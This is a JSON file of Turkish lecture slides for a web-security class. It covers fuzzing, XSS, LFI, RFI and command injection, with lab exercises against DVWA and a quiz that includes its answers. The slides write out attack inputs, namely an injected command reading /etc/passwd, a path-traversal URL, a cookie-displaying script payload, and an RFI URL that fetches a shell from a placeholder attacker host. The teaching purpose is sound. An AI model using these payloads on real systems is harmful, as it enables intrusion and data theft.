@@ -1,0 +1,290 @@
+[
+  {
+    "baslik": "Siber Güvenlik: Hafta 13",
+    "altbaslik": "Web Uygulama Güvenliği - II: Web Fuzzing, XSS ve Komut Enjeksiyonu",
+    "icerik": "Program: Bilişim Güvenliği Teknolojisi\nModül: İleri Web Zafiyetleri ve Sunucu İstismarı\nHaftalık Odak: Gobuster ile Dizin Keşfi, XSS (Reflected/Stored), LFI ve Komut Enjeksiyonu\nHedef: Web zafiyetlerini tespit etmek, istismar etmek ve yazılımsal önlemler geliştirmek.",
+    "gorsel": {
+      "type": "image",
+      "query": "web application security xss command injection fuzzing"
+    }
+  },
+  {
+    "baslik": "Neden Bu Konuyu Öğreniyoruz?",
+    "altbaslik": "Sektörel Bağlam: Tarayıcıdan Sunucu Kontrolüne",
+    "icerik": "Web zafiyetleri sadece veritabanını değil, doğrudan kullanıcıları ve sunucu işletim sistemini tehdit eder.\n- XSS ile kullanıcıların banka oturum çerezleri çalınır.\n- Komut Enjeksiyonu ile web sayfası üzerinden doğrudan Linux sunucu ele geçirilir.\nBu açıklar en yüksek dereceli (Kritik/Yüksek) siber tehditlerdir.",
+    "gorsel": {
+      "type": "image",
+      "query": "web application penetration testing dashboard code"
+    }
+  },
+  {
+    "baslik": "Haftanın Öğrenme Kazanımları",
+    "altbaslik": "Bu Dersin Sonunda Neler Kazanacaksınız?",
+    "icerik": "1. Web Fuzzing mantığını ve Gobuster ile gizli dizin taramasını açıklar.\n2. Cross-Site Scripting (XSS) türlerini (Reflected, Stored) ayırt eder.\n3. Yerel Dosya Dahil Etme (LFI) açığıyla sunucu içi dosyaları okur.\n4. Komut Enjeksiyonu (Command Injection) ile webden sunucu komutu koşturur.\n5. Nikto aracıyla otomatize web güvenlik taraması yürütür.",
+    "gorsel": {
+      "type": "image",
+      "query": "learning objectives web exploitation checklist"
+    }
+  },
+  {
+    "baslik": "Web Keşfi ve Fuzzing Nedir?",
+    "altbaslik": "Gizli Kapıları ve Panelleri Bulmak",
+    "icerik": "Web geliştiriciler yönetim panellerinin (/admin, /panel) veya yedek dosyaların (/backup.zip) linklerini ana sayfaya koymaz.\nFuzzing:\nBinlerce kelimelik sözlüklerle web sunucuya arka arkaya GET istekleri atılarak HTTP 200 (Buldum!) yanıtı veren gizli sayfaları ortaya çıkarma işlemidir.",
+    "gorsel": {
+      "type": "image",
+      "query": "web directory fuzzing gobuster directory bruteforce"
+    }
+  },
+  {
+    "baslik": "Gobuster ve Dirb Araçları",
+    "altbaslik": "Yüksek Hızlı Dizin Tarayıcıları",
+    "icerik": "Gobuster, Go diliyle yazılmış saniyede yüzlerce URL deneyebilen modern dizin ve subdomain tarayıcısıdır.\nSözdizimi:\ngobuster dir -u http://192.168.1.20/dvwa -w /usr/share/wordlists/dirb/common.txt -t 20\nDurum Kodları:\n- Status 200 / 301 : Sayfa mevcut ve erişilebilir.\n- Status 403 : Klasör var ama doğrudan girişe kapalı.",
+    "gorsel": {
+      "type": "image",
+      "query": "gobuster terminal output green status codes"
+    }
+  },
+  {
+    "baslik": "XSS (Cross-Site Scripting) Nedir?",
+    "altbaslik": "Kurbanın Tarayıcısında Kod Çalıştırmak",
+    "icerik": "XSS, web uygulamasının kullanıcıdan gelen girdiyi temizlemeden HTML içine basması sonucu, saldırganın zararlı JavaScript çalıştırmasıdır.\nTehlikesi:\n- Oturum Çerezlerinin (Session Cookies) Çalınması (document.cookie)\n- Kullanıcıyı Sahte Giriş Sayfasına Yönlendirme (Phishing)\n- Tarayıcıyı Zombi Olarak Kullanma.",
+    "gorsel": {
+      "type": "image",
+      "query": "cross site scripting xss javascript payload alert diagram"
+    }
+  },
+  {
+    "baslik": "XSS Türleri: Reflected vs Stored",
+    "altbaslik": "Yansıyan ve Kalıcı Saldırılar",
+    "icerik": "1. Reflected XSS (Yansıyan): Zararlı kod URL parametresi içindedir. Saldırgan bu linki kurbana tıklatırsa kod anlık çalışır (Arama kutuları).\n2. Stored XSS (Kalıcı): Zararlı kod veritabanına (yorum panosu, forum mesajı) kaydedilir. O sayfayı açan HER kullanıcının tarayıcısında otomatik çalışır! Çok daha tehlikelidir.",
+    "gorsel": {
+      "type": "image",
+      "query": "reflected vs stored xss comparison workflow diagram"
+    }
+  },
+  {
+    "baslik": "Komut Enjeksiyonu (Command Injection)",
+    "altbaslik": "En Ölümcül Web Zafiyeti",
+    "icerik": "Web yazılımı kullanıcının girdiği bir parametreyi işletim sistemi kabuğuna (system(), exec()) filtresiz gönderirse oluşur.\nÖrnek:\nSistem 'ping <IP>' atıyor olsun. Kullanıcı kutunun içine şunu yazarsa:\n127.0.0.1; whoami; cat /etc/passwd\nWeb sunucu önce ping atar, ardından noktalı virgül (;) yüzünden whoami ve cat komutlarını çalıştırır!",
+    "gorsel": {
+      "type": "image",
+      "query": "command injection bash shell web vulnerability diagram"
+    }
+  },
+  {
+    "baslik": "LFI (Local File Inclusion) Zafiyeti",
+    "altbaslik": "Yerel Dosya Dahil Etme",
+    "icerik": "Web uygulamasının URL üzerinden dosya çağırırken (page=hakkimizda.php) dizin geçiş karakterlerini (../) filtrelememesi zafiyetidir.\nSaldırı URL'si:\nhttp://hedef.com/index.php?page=../../../../etc/passwd\nSonuç:\nWeb sayfası sunucunun tüm sistem dosyalarını tarayıcıda ekrana basar!",
+    "gorsel": {
+      "type": "image",
+      "query": "local file inclusion lfi path traversal directory traversal"
+    }
+  },
+  {
+    "baslik": "Nikto: Otomatize Web Zafiyet Tarayıcısı",
+    "altbaslik": "Sunucu Konfigürasyon Denetimi",
+    "icerik": "Nikto, web sunucularındaki bilinen 6700'den fazla tehlikeli dosyayı, eski yazılım sürümlerini ve eksik güvenlik başlıklarını tarayan standart araçtır.\nSözdizimi:\nnikto -h http://192.168.1.20/dvwa",
+    "gorsel": {
+      "type": "image",
+      "query": "nikto web vulnerability scanner terminal report"
+    }
+  },
+  {
+    "baslik": "Uygulama Laboratuvarı: Web İstismarı",
+    "altbaslik": "Laboratuvar Hedeflerimiz",
+    "icerik": "Laboratuvarımızda (DVWA - 192.168.1.20):\n1. Gobuster ile DVWA gizli dizinlerini bulacağız.\n2. Reflected XSS ile tarayıcıda alert kutusu patlatıp çerezleri okuyacağız.\n3. Command Injection ile web sayfasından /etc/passwd dosyasını çekeceğiz.\n4. Nikto ile genel tarama yapacağız.",
+    "gorsel": {
+      "type": "image",
+      "query": "students web hacking dvwa xss terminal lab"
+    }
+  },
+  {
+    "baslik": "Uygulama 1: Gobuster ile Dizin Fuzzing",
+    "altbaslik": "Gizli Klasörleri Bulma",
+    "icerik": "Terminalde şu komutu çalıştırın:\ngobuster dir -u http://192.168.1.20/dvwa -w /usr/share/wordlists/dirb/common.txt -t 20\nBeklenen Çıktı:\n/admin (Status: 301)\n/docs (Status: 301)\n/login.php (Status: 200)\n/setup.php (Status: 200)",
+    "gorsel": {
+      "type": "image",
+      "query": "gobuster scan results terminal screen"
+    }
+  },
+  {
+    "baslik": "Uygulama 2: Reflected XSS Tetikleme",
+    "altbaslik": "Tarayıcıda JavaScript Çalıştırma",
+    "icerik": "Adım 1: DVWA sol menüsünden 'XSS (Reflected)' sekmesine tıklayın.\nAdım 2: Girdi kutusuna şu zararlı kodu yazıp Submit deyin:\n<script>alert('XSS Calisti! Cookie: ' + document.cookie);</script>\nSonuç:\nTarayıcınızda açılan uyarı kutusunda kendi oturum çerezinizi (PHPSESSID) göreceksiniz!",
+    "gorsel": {
+      "type": "image",
+      "query": "xss alert box javascript popup browser"
+    }
+  },
+  {
+    "baslik": "Uygulama 3: Komut Enjeksiyonu ile Bilgi Toplama",
+    "altbaslik": "Sunucu Kabuğuna Sızma",
+    "icerik": "Adım 1: Sol menüden 'Command Injection' sekmesine tıklayın.\nAdım 2: IP kutusuna şu komutu yazıp Submit butonuna basın:\n127.0.0.1; whoami; id\nEkrandaki Çıktı:\nwww-data\nuid=33(www-data) gid=33(www-data)",
+    "gorsel": {
+      "type": "image",
+      "query": "command injection whoami output web browser"
+    }
+  },
+  {
+    "baslik": "Uygulama 4: Komut Enjeksiyonu ile /etc/passwd Okuma",
+    "altbaslik": "Hassas Dosya İfşası",
+    "icerik": "Kutunun içine şunu yazıp gönderin:\n127.0.0.1; cat /etc/passwd\nSonuç:\nSunucudaki tüm sistem kullanıcıları web sayfasında liste halinde önünüze dökülecektir!",
+    "gorsel": {
+      "type": "image",
+      "query": "command injection cat etc passwd output web page"
+    }
+  },
+  {
+    "baslik": "Uygulama 5: Nikto ile Zafiyet Taraması",
+    "altbaslik": "Web Sunucu Denetimi",
+    "icerik": "Terminalde Nikto taramasını başlatın:\nnikto -h http://192.168.1.20/dvwa\nİnceleyin: Eksik anti-clickjacking başlıkları (X-Frame-Options) raporda listelenecektir.",
+    "gorsel": {
+      "type": "image",
+      "query": "nikto vulnerability report terminal screen"
+    }
+  },
+  {
+    "baslik": "Sık Yapılan Hatalar ve İpuçları",
+    "altbaslik": "Web İstismarında Dikkat Edilecekler",
+    "icerik": "1. Script Etiketini Kapatmamak: <script> açılıp </script> ile kapatılmazsa XSS kodu çalışmaz.\n2. Linux Komut Ayracı: Windows CMD için '&' veya '|', Linux Bash için ';' veya '&&' operatörleri kullanılır.\n3. Gobuster Liste Yolu: /usr/share/wordlists/dirb/common.txt tam yolu doğru yazılmalıdır.",
+    "gorsel": {
+      "type": "image",
+      "query": "troubleshooting web exploit syntax errors checklist"
+    }
+  },
+  {
+    "baslik": "Sektörel Vaka: Samy XSS Solucanı",
+    "altbaslik": "MySpace'i 20 Saatte Çökerten Kod",
+    "icerik": "Vaka: 2005 yılında Samy Kamkar, MySpace profil sayfasına basit bir Stored XSS kodu yerleştirdi.\nNasıl Yayıldı? Profilini ziyaret eden herkesin profiline otomatik olarak 'Ama Samy benim kahramanım' yazıyor ve kodu onların profiline de kopyalıyordu!\nSonuç: 20 saat içinde 1 milyondan fazla kullanıcıya bulaşarak tarihin en hızlı yayılan XSS solucanı oldu.",
+    "gorsel": {
+      "type": "image",
+      "query": "samy worm myspace xss viral cyber history"
+    }
+  },
+  {
+    "baslik": "Vaka Analizi: XSS ve Komut Enjeksiyonu Savunması",
+    "altbaslik": "Çıkarılan Mühendislik Dersi",
+    "icerik": "Yazılımsal Savunma Kuralları:\n1. Çıktı Kodlama (Output Encoding): Kullanıcıdan gelen <, >, & karakterleri &lt;, &gt;, &amp; formatına dönüştürülmelidir.\n2. Content Security Policy (CSP): Tarayıcının harici kaynaklardan izinsiz JavaScript çalıştırması engellenmelidir.\n3. Sistem Komutlarından Kaçınma: PHP'de asla exec() veya system() kullanılmamalıdır.",
+    "gorsel": {
+      "type": "image",
+      "query": "content security policy csp html sanitization secure coding"
+    }
+  },
+  {
+    "baslik": "Mini Quiz: Soru 1",
+    "altbaslik": "Zafiyet Türleri",
+    "icerik": "Soru: Kurbanın tarayıcısında yetkisiz JavaScript çalıştırarak oturum çerezlerini çalmayı amaçlayan web açığı hangisidir?\nA) SQL Injection\nB) XSS (Cross-Site Scripting)\nC) DoS\nD) Brute Force\n\nDoğru Cevap: B (XSS)",
+    "gorsel": {
+      "type": "image",
+      "query": "quiz question multiple choice exam board"
+    }
+  },
+  {
+    "baslik": "Mini Quiz: Soru 2",
+    "altbaslik": "Web Fuzzing",
+    "icerik": "Soru: Web sunucularındaki gizli dizinleri ve yönetim panellerini sözlük kullanarak hızlıca tarayan Go tabanlı araç hangisidir?\nA) Gobuster\nB) Wireshark\nC) Steghide\nD) John the Ripper\n\nDoğru Cevap: A (Gobuster)",
+    "gorsel": {
+      "type": "image",
+      "query": "gobuster tool question test"
+    }
+  },
+  {
+    "baslik": "Mini Quiz: Soru 3",
+    "altbaslik": "Komut Enjeksiyonu",
+    "icerik": "Soru: Web sunucusunun işletim sistemi kabuğuna yetkisiz komutlar gönderilmesini sağlayan ölümcül açık hangisidir?\nA) Command Injection (Komut Enjeksiyonu)\nB) Phishing\nC) DNS Spoofing\nD) ARP Poisoning\n\nDoğru Cevap: A (Komut Enjeksiyonu)",
+    "gorsel": {
+      "type": "image",
+      "query": "command injection question multiple choice"
+    }
+  },
+  {
+    "baslik": "Mini Quiz: Soru 4",
+    "altbaslik": "XSS Türleri",
+    "icerik": "Soru: Zararlı JavaScript kodunun doğrudan veritabanına kaydedildiği ve sayfayı açan herkesi etkileyen XSS türü hangisidir?\nA) Reflected XSS\nB) Stored XSS (Kalıcı)\nC) DOM XSS\nD) Blind SQLi\n\nDoğru Cevap: B (Stored XSS)",
+    "gorsel": {
+      "type": "image",
+      "query": "stored xss question board"
+    }
+  },
+  {
+    "baslik": "Mini Quiz: Soru 5",
+    "altbaslik": "Web Savunması",
+    "icerik": "Soru: Tarayıcının güvenilmeyen kaynaklardan gelen betikleri çalıştırmasını engelleyen HTTP güvenlik başlığı hangisidir?\nA) CSP (Content Security Policy)\nB) HTTP 404\nC) GET\nD) SSH\n\nDoğru Cevap: A (CSP)",
+    "gorsel": {
+      "type": "image",
+      "query": "csp header security question"
+    }
+  },
+  {
+    "baslik": "Sınıf İçi Tartışma ve Uygulama",
+    "altbaslik": "Kendi XSS Mesajınızı Tasarlayın",
+    "icerik": "Uygulama Görevi:\nDVWA XSS formunda alert içine kendi adınızı ve bugünün tarihini yazdıran JavaScript kodunu ilk çalıştıran öğrenci el kaldırsın!",
+    "gorsel": {
+      "type": "image",
+      "query": "students competition classroom coding linux challenge"
+    }
+  },
+  {
+    "baslik": "DOM Tabanlı XSS (DOM-based XSS)",
+    "altbaslik": "Tarayıcı Belleğinde Çalışan Açık",
+    "icerik": "Sunucuya hiç gitmeden, doğrudan istemcinin tarayıcısındaki JavaScript kodunun (document.location, innerHTML) güvensiz işlenmesiyle oluşur.\n- Sunucu loglarına düşmez; tamamen tarayıcının yerel hafızasında gerçekleşir.\nSavunma: innerHTML yerine güvenli olan textContent kullanılmalıdır.",
+    "gorsel": {
+      "type": "image",
+      "query": "dom based xss javascript document object model diagram"
+    }
+  },
+  {
+    "baslik": "RFI (Remote File Inclusion) Tehlikesi",
+    "altbaslik": "Dış Sunucudan Zararlı Kod Çağırma",
+    "icerik": "RFI zafiyetinde saldırgan kendi kontrolündeki dış web sunucusundaki zararlı PHP dosyasını kurban sunucuya çektirip çalıştırır:\nhttp://hedef.com/index.php?page=http://saldirgan.com/shell.txt\nSavunma: PHP yapılandırma dosyasında (php.ini) 'allow_url_include = Off' yapılmalıdır.",
+    "gorsel": {
+      "type": "image",
+      "query": "remote file inclusion rfi web shell execution diagram"
+    }
+  },
+  {
+    "baslik": "Web Zafiyet Tarayıcısı: OWASP ZAP",
+    "altbaslik": "Açık Kaynaklı Web Güvenlik Test Aracı",
+    "icerik": "OWASP ZAP (Zed Attack Proxy):\nWeb uygulamalarındaki XSS, SQLi ve yapılandırma açıklarını tarayıcı trafiğini araya girip yakalayarak (Proxy) otomatik test eden dünyanın en popüler açık kaynaklı web güvenlik aracıdır.",
+    "gorsel": {
+      "type": "image",
+      "query": "owasp zap zed attack proxy graphical interface scanner"
+    }
+  },
+  {
+    "baslik": "Güvenli Web Çıktı Kodlama (Output Encoding)",
+    "altbaslik": "XSS'i Kökten Bitiren Dönüşüm",
+    "icerik": "HTML Özel Karakter Dönüşüm Tablosu:\n- < karakteri -> &lt;\n- > karakteri -> &gt;\n- \" karakteri -> &quot;\n- ' karakteri -> &#x27;\n- & karakteri -> &amp;\nBu dönüşüm yapıldığında tarayıcı kodu çalıştırmaz, sadece düz yazı olarak ekranda gösterir!",
+    "gorsel": {
+      "type": "image",
+      "query": "html output encoding sanitization table xss defense"
+    }
+  },
+  {
+    "baslik": "Haftalık Konu Özeti",
+    "altbaslik": "Bu Hafta Neler Öğrendik?",
+    "icerik": "- Web Fuzzing (Gobuster) gizli yönetim panellerini ortaya çıkarır.\n- XSS istemci tarayıcısını, Komut Enjeksiyonu ise doğrudan sunucu işletim sistemini hedef alır.\n- LFI açığı sunucu dosyalarının izinsiz okunmasına yol açar.\n- Çıktı kodlama (Encoding), CSP ve girdi doğrulama temel savunma yöntemleridir.",
+    "gorsel": {
+      "type": "image",
+      "query": "summary concept mind map review"
+    }
+  },
+  {
+    "baslik": "Gelecek Haftaya Bakış",
+    "altbaslik": "Hafta 14: Hizmet Dışı Bırakma (DoS / DDoS) Atakları",
+    "icerik": "Ön Hazırlık:\n- DoS ile DDoS arasındaki temel fark nedir?\n- SYN Flood ve Slowloris saldırıları sunucuları nasıl çökertir?\n- hping3 aracıyla paket analizi ve SYN Cookies savunması nasıl çalışır?",
+    "gorsel": {
+      "type": "image",
+      "query": "dos ddos attack botnet defense cyber concept"
+    }
+  },
+  {
+    "baslik": "Çıkış Bileti (Exit Ticket)",
+    "altbaslik": "Dersi Bitirmeden Önce Cevaplayınız",
+    "icerik": "Günün Sorusu:\n'Reflected XSS ile Stored XSS arasındaki etki ve kalıcılık farkını tek bir cümleyle açıklayınız.'\n\nCevabınızı kâğıda yazıp teslim ediniz.",
+    "gorsel": {
+      "type": "image",
+      "query": "exit ticket paper feedback classroom student"
+    }
+  }
+]
